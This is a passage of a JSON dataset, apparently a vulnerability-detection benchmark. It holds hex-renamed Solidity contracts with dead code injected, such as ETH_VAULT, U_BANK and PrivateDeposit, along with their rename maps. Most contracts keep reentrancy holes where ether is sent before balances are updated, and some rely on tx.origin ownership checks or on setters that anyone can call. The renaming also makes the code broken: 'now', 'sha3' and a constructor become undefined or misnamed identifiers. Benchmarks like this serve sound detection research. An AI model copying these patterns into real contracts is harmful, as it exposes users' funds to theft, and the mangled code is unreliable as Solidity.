_0xb98b5b,uint _0xff71ab,string _0x6c79ad)\n    public\n    {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n        LastMsg.Sender = _0xb98b5b;\n        LastMsg.Time = _0x815d72;\n        LastMsg.Val = _0xff71ab;\n        LastMsg.Data = _0x6c79ad;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "balances": "_0xd541fa",
        "_data": "_0x6c79ad",
        "_adr": "_0xb98b5b",
        "_log": "_0x83451f",
        "_val": "_0xff71ab",
        "_am": "_0xc0b2a4",
        "now": "_0x815d72"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_019",
      "transformed_id": "ss_l4_medium_sn_ds_019",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\n\ncontract ACCURAL_DEPOSIT\n{\n    mapping (address=>uint256) public _0xee564e;\n\n    uint public MinSum = 1 ether;\n\n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n\n    bool _0xf47144;\n\n    function SetMinSum(uint _0xf1aace)\n    public\n    {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        if(_0xf47144)revert();\n        MinSum = _0xf1aace;\n    }\n\n    function SetLogFile(address _0x4d96a8)\n    public\n    {\n        if (false) { revert(); }\n        bool _flag4 = false;\n        if(_0xf47144)revert();\n        Log = LogFile(_0x4d96a8);\n    }\n\n    function Initialized()\n    public\n    {\n        _0xf47144 = true;\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        _0xee564e[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x0f93a9)\n    public\n    payable\n    {\n        if(_0xee564e[msg.sender]>=MinSum && _0xee564e[msg.sender]>=_0x0f93a9)\n        {\n            if(msg.sender.call.value(_0x0f93a9)())\n            {\n                _0xee564e[msg.sender]-=_0x0f93a9;\n                Log.AddMessage(msg.sender,_0x0f93a9,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Deposit();\n    }\n\n}\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x9ee8f3,uint _0xf1aace,string _0xe99f4c)\n    public\n    {\n        LastMsg.Sender = _0x9ee8f3;\n        LastMsg.Time = _0x20456b;\n        LastMsg.Val = _0xf1aace;\n        LastMsg.Data = _0xe99f4c;\n        History.push(LastMsg);\n    }\n}\n",
      "rename_map": {
        "intitalized": "_0xf47144",
        "balances": "_0xee564e",
        "_data": "_0xe99f4c",
        "_adr": "_0x9ee8f3",
        "_log": "_0x4d96a8",
        "_val": "_0xf1aace",
        "_am": "_0x0f93a9",
        "now": "_0x20456b"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_020",
      "transformed_id": "ss_l4_medium_sn_ds_020",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract PRIVATE_ETH_CELL\n{\n    mapping (address=>uint256) public _0xe4584a;\n\n    uint public MinSum;\n\n    LogFile Log;\n\n    bool _0x622ebb;\n\n    function SetMinSum(uint _0x83e7ed)\n    public\n    {\n        // Placeholder for future logic\n        bool _flag2 = false;\n        require(!_0x622ebb);\n        MinSum = _0x83e7ed;\n    }\n\n    function SetLogFile(address _0xbe4bfc)\n    public\n    {\n        if (false) { revert(); }\n        bool _flag4 = false;\n        require(!_0x622ebb);\n        Log = LogFile(_0xbe4bfc);\n    }\n\n    function Initialized()\n    public\n    {\n        _0x622ebb = true;\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        _0xe4584a[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x46307e)\n    public\n    payable\n    {\n        if(_0xe4584a[msg.sender]>=MinSum && _0xe4584a[msg.sender]>=_0x46307e)\n        {\n            if(msg.sender.call.value(_0x46307e)())\n            {\n                _0xe4584a[msg.sender]-=_0x46307e;\n                Log.AddMessage(msg.sender,_0x46307e,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Deposit();\n    }\n\n}\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x90625a,uint _0x83e7ed,string _0x77c9ea)\n    public\n    {\n        LastMsg.Sender = _0x90625a;\n        LastMsg.Time = _0xd5c5c9;\n        LastMsg.Val = _0x83e7ed;\n        LastMsg.Data = _0x77c9ea;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "intitalized": "_0x622ebb",
        "balances": "_0xe4584a",
        "_data": "_0x77c9ea",
        "_adr": "_0x90625a",
        "_log": "_0xbe4bfc",
        "_val": "_0x83e7ed",
        "_am": "_0x46307e",
        "now": "_0xd5c5c9"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_021",
      "transformed_id": "ss_l4_medium_sn_ds_021",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract BANK_SAFE\n{\n    mapping (address=>uint256) public _0x307886;\n\n    uint public MinSum;\n\n    LogFile Log;\n\n    bool _0xdff819;\n\n    function SetMinSum(uint _0x462ff3)\n    public\n    {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        if(_0xdff819)throw;\n        MinSum = _0x462ff3;\n    }\n\n    function SetLogFile(address _0xac857e)\n    public\n    {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        if(_0xdff819)throw;\n        Log = LogFile(_0xac857e);\n    }\n\n    function Initialized()\n    public\n    {\n        _0xdff819 = true;\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        _0x307886[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x5ca946)\n    public\n    payable\n    {\n        if(_0x307886[msg.sender]>=MinSum && _0x307886[msg.sender]>=_0x5ca946)\n        {\n            if(msg.sender.call.value(_0x5ca946)())\n            {\n                _0x307886[msg.sender]-=_0x5ca946;\n                Log.AddMessage(msg.sender,_0x5ca946,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Deposit();\n    }\n\n}\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x75a32e,uint _0x462ff3,string _0x67a182)\n    public\n    {\n        LastMsg.Sender = _0x75a32e;\n        LastMsg.Time = _0x5dec10;\n        LastMsg.Val = _0x462ff3;\n        LastMsg.Data = _0x67a182;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "intitalized": "_0xdff819",
        "balances": "_0x307886",
        "_data": "_0x67a182",
        "_adr": "_0x75a32e",
        "_log": "_0xac857e",
        "_val": "_0x462ff3",
        "_am": "_0x5ca946",
        "now": "_0x5dec10"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_022",
      "transformed_id": "ss_l4_medium_sn_ds_022",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address _0x2c62d2;\n    address _0x6e9d31 = msg.sender;\n\n    function _0x94131c(address _0x3a72d0)\n    public\n    _0xc005cd\n    {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        _0x2c62d2 = _0x3a72d0;\n    }\n\n    function _0xb29609()\n    public\n    {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        if(msg.sender==_0x2c62d2)\n        {\n            _0x6e9d31=_0x2c62d2;\n        }\n    }\n\n    modifier _0xc005cd\n    {\n        if(_0x6e9d31 == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address _0x6e9d31 = msg.sender;\n    function WithdrawToken(address _0xe5db3c, uint256 _0x64a4ae,address _0xc933f9)\n    public\n    _0xc005cd\n    {\n        _0xe5db3c.call(bytes4(_0x2be6f6(\"transfer(address,uint256)\")),_0xc933f9,_0x64a4ae);\n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n\n     ///Constructor\n    function _0x3ecd1f()\n    public\n    {\n        _0x6e9d31 = msg.sender;\n        MinDeposit = 1 ether;\n    }\n\n    function()\n    payable\n    {\n        Deposit();\n    }\n\n    function Deposit()\n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n\n    function WitdrawTokenToHolder(address _0x6bfa24,address _0xbfb848,uint _0x4c5970)\n    public\n    _0xc005cd\n    {\n        if(Holders[_0x6bfa24]>0)\n        {\n            Holders[_0x6bfa24]=0;\n            WithdrawToken(_0xbfb848,_0x4c5970,_0x6bfa24);\n        }\n    }\n\n    function WithdrawToHolder(address _0xf939f4, uint _0x1819b5)\n    public\n    _0xc005cd\n    payable\n    {\n        if(Holders[_0xf939f4]>0)\n        {\n            if(_0xf939f4.call.value(_0x1819b5)())\n            {\n                Holders[_0xf939f4]-=_0x1819b5;\n            }\n        }\n    }\n}",
      "rename_map": {
        "initTokenBank": "_0x3ecd1f",
        "confirmOwner": "_0xb29609",
        "changeOwner": "_0x94131c",
        "onlyOwner": "_0xc005cd",
        "newOwner": "_0x2c62d2",
        "_amount": "_0x4c5970",
        "amount": "_0x64a4ae",
        "_token": "_0xbfb848",
        "token": "_0xe5db3c",
        "_addr": "_0xf939f4",
        "owner": "_0x6e9d31",
        "addr": "_0x3a72d0",
        "_wei": "_0x1819b5",
        "sha3": "_0x2be6f6",
        "_to": "_0x6bfa24",
        "to": "_0xc933f9"
      },
      "changes": [
        "Renamed 16 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_023",
      "transformed_id": "ss_l4_medium_sn_ds_023",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract U_BANK\n{\n    function Put(uint _0x2dbccf)\n    public\n    payable\n    {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        var _0x3939ae = Acc[msg.sender];\n        _0x3939ae.balance += msg.value;\n        _0x3939ae._0xdf454a = _0x2dbccf>_0x372ea3?_0x2dbccf:_0x372ea3;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x2147c2)\n    public\n    payable\n    {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        var _0x3939ae = Acc[msg.sender];\n        if( _0x3939ae.balance>=MinSum && _0x3939ae.balance>=_0x2147c2 && _0x372ea3>_0x3939ae._0xdf454a)\n        {\n            if(msg.sender.call.value(_0x2147c2)())\n            {\n                _0x3939ae.balance-=_0x2147c2;\n                LogFile.AddMessage(msg.sender,_0x2147c2,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder\n    {\n        uint _0xdf454a;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 2 ether;\n\n    function U_BANK(address _0x4e354c) public{\n        LogFile = Log(_0x4e354c);\n    }\n}\n\ncontract Log\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xf94de2,uint _0xa76d60,string _0xb9beaa)\n    public\n    {\n        LastMsg.Sender = _0xf94de2;\n        LastMsg.Time = _0x372ea3;\n        LastMsg.Val = _0xa76d60;\n        LastMsg.Data = _0xb9beaa;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "_unlockTime": "_0x2dbccf",
        "unlockTime": "_0xdf454a",
        "_data": "_0xb9beaa",
        "_val": "_0xa76d60",
        "_adr": "_0xf94de2",
        "_am": "_0x2147c2",
        "acc": "_0x3939ae",
        "now": "_0x372ea3",
        "log": "_0x4e354c"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_024",
      "transformed_id": "ss_l4_medium_sn_ds_024",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract PrivateDeposit\n{\n    mapping (address => uint) public _0x4dedf5;\n\n    uint public MinDeposit = 1 ether;\n    address public _0x299685;\n\n    Log TransferLog;\n\n    modifier _0xc4e006() {\n        require(tx.origin == _0x299685);\n        _;\n    }\n\n    function PrivateDeposit()\n    {\n        _0x299685 = msg.sender;\n        TransferLog = new Log();\n    }\n\n    function _0xafc26d(address _0x115c12) _0xc4e006\n    {\n        TransferLog = Log(_0x115c12);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        if(msg.value >= MinDeposit)\n        {\n            _0x4dedf5[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n\n    function CashOut(uint _0x10e72b)\n    {\n        if(_0x10e72b<=_0x4dedf5[msg.sender])\n        {\n            if(msg.sender.call.value(_0x10e72b)())\n            {\n                _0x4dedf5[msg.sender]-=_0x10e72b;\n                TransferLog.AddMessage(msg.sender,_0x10e72b,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xbb619e,uint _0x5d8076,string _0x4fbfba)\n    public\n    {\n        bool _flag3 = false;\n        uint256 _unused4 = 0;\n        LastMsg.Sender = _0xbb619e;\n        LastMsg.Time = _0x023834;\n        LastMsg.Val = _0x5d8076;\n        LastMsg.Data = _0x4fbfba;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "onlyOwner": "_0xc4e006",
        "balances": "_0x4dedf5",
        "setLog": "_0xafc26d",
        "owner": "_0x299685",
        "_data": "_0x4fbfba",
        "_adr": "_0xbb619e",
        "_lib": "_0x115c12",
        "_val": "_0x5d8076",
        "_am": "_0x10e72b",
        "now": "_0x023834"
      },
      "changes": [
        "Renamed 10 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_025",
      "transformed_id": "ss_l4_medium_sn_ds_025",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract W_WALLET\n{\n    function Put(uint _0x4ad77d)\n    public\n    payable\n    {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        var _0x2bda7d = Acc[msg.sender];\n        _0x2bda7d.balance += msg.value;\n        _0x2bda7d._0xd41d95 = _0x4ad77d>_0x77b21b?_0x4ad77d:_0x77b21b;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x583c2b)\n    public\n    payable\n    {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        var _0x2bda7d = Acc[msg.sender];\n        if( _0x2bda7d.balance>=MinSum && _0x2bda7d.balance>=_0x583c2b && _0x77b21b>_0x2bda7d._0xd41d95)\n        {\n            if(msg.sender.call.value(_0x583c2b)())\n            {\n                _0x2bda7d.balance-=_0x583c2b;\n                LogFile.AddMessage(msg.sender,_0x583c2b,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder\n    {\n        uint _0xd41d95;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;\n\n    function W_WALLET(address _0xeaa8a9) public{\n        LogFile = Log(_0xeaa8a9);\n    }\n}\n\ncontract Log\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x92e2f3,uint _0x35475d,string _0x2d8041)\n    public\n    {\n        LastMsg.Sender = _0x92e2f3;\n        LastMsg.Time = _0x77b21b;\n        LastMsg.Val = _0x35475d;\n        LastMsg.Data = _0x2d8041;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "_unlockTime": "_0x4ad77d",
        "unlockTime": "_0xd41d95",
        "_data": "_0x2d8041",
        "_val": "_0x35475d",
        "_adr": "_0x92e2f3",
        "_am": "_0x583c2b",
        "acc": "_0x2bda7d",
        "now": "_0x77b21b",
        "log": "_0xeaa8a9"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_026",
      "transformed_id": "ss_l4_medium_sn_ds_026",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public _0xcf775e;\n\n    Log TransferLog;\n\n    uint public MinDeposit = 1 ether;\n\n    function ETH_VAULT(address _0x6f2ce3)\n    public\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        TransferLog = Log(_0x6f2ce3);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        if(msg.value > MinDeposit)\n        {\n            _0xcf775e[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n\n    function CashOut(uint _0xe348c3)\n    public\n    payable\n    {\n        if(_0xe348c3<=_0xcf775e[msg.sender])\n        {\n            if(msg.sender.call.value(_0xe348c3)())\n            {\n                _0xcf775e[msg.sender]-=_0xe348c3;\n                TransferLog.AddMessage(msg.sender,_0xe348c3,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x1a2873,uint _0xccaef9,string _0x212281)\n    public\n    {\n        LastMsg.Sender = _0x1a2873;\n        LastMsg.Time = _0xbe92ee;\n        LastMsg.Val = _0xccaef9;\n        LastMsg.Data = _0x212281;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "balances": "_0xcf775e",
        "_data": "_0x212281",
        "_adr": "_0x1a2873",
        "_log": "_0x6f2ce3",
        "_val": "_0xccaef9",
        "_am": "_0xe348c3",
        "now": "_0xbe92ee"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_027",
      "transformed_id": "ss_l4_medium_sn_ds_027",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract X_WALLET\n{\n    function Put(uint _0xa9175d)\n    public\n    payable\n    {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        var _0x8c8d13 = Acc[msg.sender];\n        _0x8c8d13.balance += msg.value;\n        _0x8c8d13._0x708dd9 = _0xa9175d>_0xf9698a?_0xa9175d:_0xf9698a;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x64888b)\n    public\n    payable\n    {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        var _0x8c8d13 = Acc[msg.sender];\n        if( _0x8c8d13.balance>=MinSum && _0x8c8d13.balance>=_0x64888b && _0xf9698a>_0x8c8d13._0x708dd9)\n        {\n            if(msg.sender.call.value(_0x64888b)())\n            {\n                _0x8c8d13.balance-=_0x64888b;\n                LogFile.AddMessage(msg.sender,_0x64888b,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder\n    {\n        uint _0x708dd9;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;\n\n    function X_WALLET(address _0x265828) public{\n        LogFile = Log(_0x265828);\n    }\n}\n\ncontract Log\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x94a2e5,uint _0xd6c12d,string _0x88e406)\n    public\n    {\n        LastMsg.Sender = _0x94a2e5;\n        LastMsg.Time = _0xf9698a;\n        LastMsg.Val = _0xd6c12d;\n        LastMsg.Data = _0x88e406;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "_unlockTime": "_0xa9175d",
        "unlockTime": "_0x708dd9",
        "_data": "_0x88e406",
        "_val": "_0xd6c12d",
        "_adr": "_0x94a2e5",
        "_am": "_0x64888b",
        "acc": "_0x8c8d13",
        "now": "_0xf9698a",
        "log": "_0x265828"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_028",
      "transformed_id": "ss_l4_medium_sn_ds_028",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract ETH_FUND\n{\n    mapping (address => uint) public _0xfffcba;\n\n    uint public MinDeposit = 1 ether;\n\n    Log TransferLog;\n\n    uint _0x585627;\n\n    function ETH_FUND(address _0x7447d2)\n    public\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        TransferLog = Log(_0x7447d2);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        if (false) { revert(); }\n        // Placeholder for future logic\n        if(msg.value > MinDeposit)\n        {\n            _0xfffcba[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n            _0x585627 = block.number;\n        }\n    }\n\n    function CashOut(uint _0x191762)\n    public\n    payable\n    {\n        if(_0x191762<=_0xfffcba[msg.sender]&&block.number>_0x585627)\n        {\n            if(msg.sender.call.value(_0x191762)())\n            {\n                _0xfffcba[msg.sender]-=_0x191762;\n                TransferLog.AddMessage(msg.sender,_0x191762,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x389510,uint _0x54b3e8,string _0x675b28)\n    public\n    {\n        LastMsg.Sender = _0x389510;\n        LastMsg.Time = _0x32f5ad;\n        LastMsg.Val = _0x54b3e8;\n        LastMsg.Data = _0x675b28;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "lastBlock": "_0x585627",
        "balances": "_0xfffcba",
        "_data": "_0x675b28",
        "_adr": "_0x389510",
        "_log": "_0x7447d2",
        "_val": "_0x54b3e8",
        "_am": "_0x191762",
        "now": "_0x32f5ad"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_029",
      "transformed_id": "ss_l4_medium_sn_ds_029",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract PENNY_BY_PENNY\n{\n    struct Holder\n    {\n        uint _0xa0cdfa;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    uint public MinSum;\n\n    LogFile Log;\n\n    bool _0x3afdf3;\n\n    function SetMinSum(uint _0x722b31)\n    public\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        if(_0x3afdf3)throw;\n        MinSum = _0x722b31;\n    }\n\n    function SetLogFile(address _0xc81570)\n    public\n    {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        if(_0x3afdf3)throw;\n        Log = LogFile(_0xc81570);\n    }\n\n    function Initialized()\n    public\n    {\n        _0x3afdf3 = true;\n    }\n\n    function Put(uint _0x1b1cbb)\n    public\n    payable\n    {\n        var _0x74556f = Acc[msg.sender];\n        _0x74556f.balance += msg.value;\n        if(_0x9ed826+_0x1b1cbb>_0x74556f._0xa0cdfa)_0x74556f._0xa0cdfa=_0x9ed826+_0x1b1cbb;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x11f852)\n    public\n    payable\n    {\n        var _0x74556f = Acc[msg.sender];\n        if( _0x74556f.balance>=MinSum && _0x74556f.balance>=_0x11f852 && _0x9ed826>_0x74556f._0xa0cdfa)\n        {\n            if(msg.sender.call.value(_0x11f852)())\n            {\n                _0x74556f.balance-=_0x11f852;\n                Log.AddMessage(msg.sender,_0x11f852,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Put(0);\n    }\n\n}\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xc7fc00,uint _0x722b31,string _0xddd0f9)\n    public\n    {\n        LastMsg.Sender = _0xc7fc00;\n        LastMsg.Time = _0x9ed826;\n        LastMsg.Val = _0x722b31;\n        LastMsg.Data = _0xddd0f9;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "intitalized": "_0x3afdf3",
        "unlockTime": "_0xa0cdfa",
        "_lockTime": "_0x1b1cbb",
        "_data": "_0xddd0f9",
        "_log": "_0xc81570",
        "_val": "_0x722b31",
        "_adr": "_0xc7fc00",
        "_am": "_0x11f852",
        "acc": "_0x74556f",
        "now": "_0x9ed826"
      },
      "changes": [
        "Renamed 10 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_030",
      "transformed_id": "ss_l4_medium_sn_ds_030",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract DEP_BANK\n{\n    mapping (address=>uint256) public _0x4c289b;\n\n    uint public MinSum;\n\n    LogFile Log;\n\n    bool _0xfb9989;\n\n    function SetMinSum(uint _0x09b9a0)\n    public\n    {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        if(_0xfb9989)throw;\n        MinSum = _0x09b9a0;\n    }\n\n    function SetLogFile(address _0x02728e)\n    public\n    {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        if(_0xfb9989)throw;\n        Log = LogFile(_0x02728e);\n    }\n\n    function Initialized()\n    public\n    {\n        _0xfb9989 = true;\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        _0x4c289b[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x4e573c)\n    public\n    payable\n    {\n        if(_0x4c289b[msg.sender]>=MinSum && _0x4c289b[msg.sender]>=_0x4e573c)\n        {\n            if(msg.sender.call.value(_0x4e573c)())\n            {\n                _0x4c289b[msg.sender]-=_0x4e573c;\n                Log.AddMessage(msg.sender,_0x4e573c,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Deposit();\n    }\n\n}\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x709200,uint _0x09b9a0,string _0xd3297d)\n    public\n    {\n        LastMsg.Sender = _0x709200;\n        LastMsg.Time = _0x86bc09;\n        LastMsg.Val = _0x09b9a0;\n        LastMsg.Data = _0xd3297d;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "intitalized": "_0xfb9989",
        "balances": "_0x4c289b",
        "_data": "_0xd3297d",
        "_adr": "_0x709200",
        "_log": "_0x02728e",
        "_val": "_0x09b9a0",
        "_am": "_0x4e573c",
        "now": "_0x86bc09"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_031",
      "transformed_id": "ss_l4_medium_sn_ds_031",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
